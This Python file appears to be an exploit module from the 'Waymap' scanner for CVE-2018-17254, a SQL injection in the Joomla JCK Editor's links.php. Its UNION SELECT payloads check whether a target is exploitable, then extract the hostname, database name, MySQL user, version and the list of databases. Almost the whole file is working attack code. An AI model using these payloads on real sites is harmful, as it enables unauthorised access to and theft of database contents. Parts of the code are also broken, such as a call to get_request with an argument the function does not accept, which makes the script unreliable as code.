# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2018-17254

import requests
import re
import base64 
from termcolor import colored
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def green(text): return f"\033[92m{text}\033[0m"
def red(text): return f"\033[91m{text}\033[0m"
def yellow(text): return f"\033[93m{text}\033[0m"
def cyan(text): return f"\033[96m{text}\033[0m"
def bold(text): return f"\033[1m{text}\033[0m"

vuln_file = '/editors/jckeditor/plugins/jtreelink/dialogs/links.php'

def payload(str1, str2=""):
    return f'?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,{str1},NULL,NULL,NULL,NULL,NULL{str2}--%20aa'

def get_request(profile_url):
    response = requests.get(profile_url, verify=False)
    return response.text

def inject(profile_url, payload):
    global vuln_file
    request_profile_url = profile_url + vuln_file + payload
    response = get_request(request_profile_url, verify=False)
    matches = re.findall(r'profile_url ="(.*)">', response)
    return matches

def is_vulnerable(profile_url):
    output = inject(profile_url, payload("0x6861636b6564")) 
    if output and base64.b64encode(output[0].encode()).decode() == "aGFja2Vk":  
        return True
    return False

def get_db_names(profile_url):
    db_names = []
    output = inject(profile_url, payload("schema_name", "%20from%20information_schema.schemata"))
    db_names.extend(output)
    return db_names

def get_table_names(profile_url, db):
    table_names = []
    output = inject(profile_url, payload("table_name", f"%20from%20information_schema.tables%20WHERE%20table_schema='{db}'"))
    table_names.extend(output)
    return table_names

def scan_cve_2018_17254(profile_url):
    print(colored("[+] Checking if target is vulnerable...", "cyan", attrs=["bold"]))
    
    if is_vulnerable(profile_url):
        main_db = inject(profile_url, payload("database()"))[0]
        hostname = inject(profile_url, payload("@@hostname"))[0]
        mysql_user = inject(profile_url, payload("user()"))[0]
        mysql_version = inject(profile_url, payload("@@version"))[0]
        connection_id = inject(profile_url, payload("connection_id()"))[0]
        
        print(colored("[+] Target is vulnerable! =)\n", "green", attrs=["bold"]))
        print(colored("[i] Hostname: ", "cyan", attrs=["bold"]) + colored(hostname, "yellow", attrs=["bold"]))
        print(colored("[i] Current database: ", "cyan", attrs=["bold"]) + colored(main_db, "yellow", attrs=["bold"]))
        print(colored("[i] MySQL version: ", "cyan", attrs=["bold"]) + colored(mysql_version, "yellow", attrs=["bold"]))
        print(colored("[i] MySQL user: ", "cyan", attrs=["bold"]) + colored(mysql_user, "yellow", attrs=["bold"]))
        print(colored("[i] Connection ID: ", "cyan", attrs=["bold"]) + colored(connection_id, "yellow", attrs=["bold"]))
        
        print(colored("[+] Getting DB names...", "cyan", attrs=["bold"]))
        dbs = get_db_names(profile_url)
        for db in dbs:
            print(colored(f"[+] DB found: {db}", "green", attrs=["bold"]))
    else:
        print(colored("[-] Target is not vulnerable.", "red", attrs=["bold"]))

